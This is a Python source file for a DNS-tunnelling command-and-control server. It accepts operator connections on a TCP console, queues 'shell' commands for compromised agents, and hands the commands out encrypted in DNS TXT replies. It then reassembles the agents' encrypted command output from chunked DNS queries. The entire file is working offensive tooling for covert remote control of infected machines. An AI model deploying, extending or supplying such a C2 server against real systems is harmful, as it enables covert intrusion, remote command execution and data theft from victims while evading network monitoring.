import socket
import threading
from dnslib import DNSRecord, RR, QTYPE, TXT
from queue import Queue
from encrypt import encrypt_message, decrypt_message

# Data structures for sessions and operator management
sessions = {}  # {session_id: address}
command_queues = {}  # {session_id: Queue()}
session_locks = {}  # {session_id: threading.Lock()}
operators = {}
current_output = []  # Buffer for collecting output chunks

SECRET_KEY = b'' # Generate a secret with `secrets.token_bytes(32)` and replace it in the agent and server script

def handle_operator_connection(operator_sock):
    operators[operator_sock] = None  # Initialize with no selected session
    try:
        while True:
            command = operator_sock.recv(1024).decode().strip()
            if not command:
                continue

            if command == "sessions":
                response = "Active sessions:\n"
                for i, session_id in enumerate(sessions.keys(), 1):
                    response += f"[{i}] {session_id}\n"
                operator_sock.sendall(response.encode())

            elif command.startswith("select "):
                session_index = int(command.split()[1]) - 1
                session_list = list(sessions.keys())
                if 0 <= session_index < len(session_list):
                    selected_session = session_list[session_index]
                    operators[operator_sock] = selected_session  # Update selected session
                    operator_sock.sendall(f"Selected session: {selected_session}\n".encode())
                else:
                    operator_sock.sendall("Invalid session selection.\n".encode())

            elif command.startswith("shell ") and operators[operator_sock]:
                selected_session = operators[operator_sock]
                with session_locks[selected_session]:
                    command_queues[selected_session].put(command)
                    #operator_sock.sendall(f"Queued command for {selected_session}: {command}\n".encode())

            elif command == "exit":
                operator_sock.sendall("Goodbye!\n".encode())
                break

            else:
                operator_sock.sendall("Unknown command or no session selected.\n".encode())

    except Exception as e:
        print(f"Error handling operator connection: {e}")
    finally:
        operator_sock.close()
        del operators[operator_sock]  # Remove operator from dictionary




# DNS query handler for agents
def handle_dns_query(data, addr, sock):
    request = DNSRecord.parse(data)
    query_name = str(request.q.qname).rstrip(".")
    query_type = QTYPE[request.q.qtype]

    response = request.reply()

    if query_type == "TXT":
        if query_name.startswith("handshake."):
            client_id = query_name.split(".")[1]
            if client_id not in sessions:
                sessions[client_id] = addr
                command_queues[client_id] = Queue()
                session_locks[client_id] = threading.Lock()
                print(f"New session established with ID: {client_id}")
            response.add_answer(RR(query_name, QTYPE.TXT, rdata=TXT("HANDSHAKE_OK"), ttl=60))

        elif query_name.startswith("poll."):
            client_id = query_name.split(".")[1]
            if client_id in command_queues:
                with session_locks[client_id]:
                    if not command_queues[client_id].empty():
                        command = command_queues[client_id].get()
                        encrypted_command = encrypt_message(command, SECRET_KEY)
                        response.add_answer(RR(query_name, QTYPE.TXT, rdata=TXT(encrypted_command), ttl=60))
                    else:
                        response.add_answer(RR(query_name, QTYPE.TXT, rdata=TXT("NO_CMD"), ttl=60))

        elif query_name.startswith("output."):
            parts = query_name.split(".")
            client_id = parts[1]
            if parts[2] == "END":
                encrypted_output = ''.join(chunk.decode('utf-8') for chunk in current_output)
                try:
                    # Decrypt the output
                    output_data = decrypt_message(encrypted_output, SECRET_KEY)
                    print(f"Output from {client_id}:\n{output_data}")
                    
                    # Find the operator associated with the selected session
                    for operator_sock, selected_session in operators.items():
                        if selected_session == client_id:
                            operator_sock.sendall(f"Output from {client_id}:\n{output_data}".encode())
                            break
                except Exception as e:
                    print(f"Error decrypting or sending output: {e}")
                
                current_output.clear()


            else:
                chunk_index = int(parts[2])
                chunk_data = request.rr[0].rdata.data[0]
                current_output.append(chunk_data)
                response.add_answer(RR(query_name, QTYPE.TXT, rdata=TXT("RECEIVED"), ttl=60))

    sock.sendto(response.pack(), addr)


# Start the operator server on port 9000
def start_operator_server(host="0.0.0.0", port=9000):
    operator_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    operator_sock.bind((host, port))
    operator_sock.listen(5)
    print(f"Operator server listening on {host}:{port}")

    while True:
        conn, _ = operator_sock.accept()
        operators[conn] = None  # Initialize with no selected session
        print("New operator connected.")

        threading.Thread(target=handle_operator_connection, args=(conn,), daemon=True).start()


# Start the DNS server on port 9053
def start_dns_server(host="0.0.0.0", port=9053):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((host, port))
    print(f"DNS C2 server running on {host}:{port}")

    try:
        while True:
            data, addr = sock.recvfrom(512)
            threading.Thread(target=handle_dns_query, args=(data, addr, sock), daemon=True).start()
    except KeyboardInterrupt:
        print("\nShutting down DNS server.")
    finally:
        sock.close()


if __name__ == "__main__":
    threading.Thread(target=start_operator_server, daemon=True).start()
    start_dns_server()
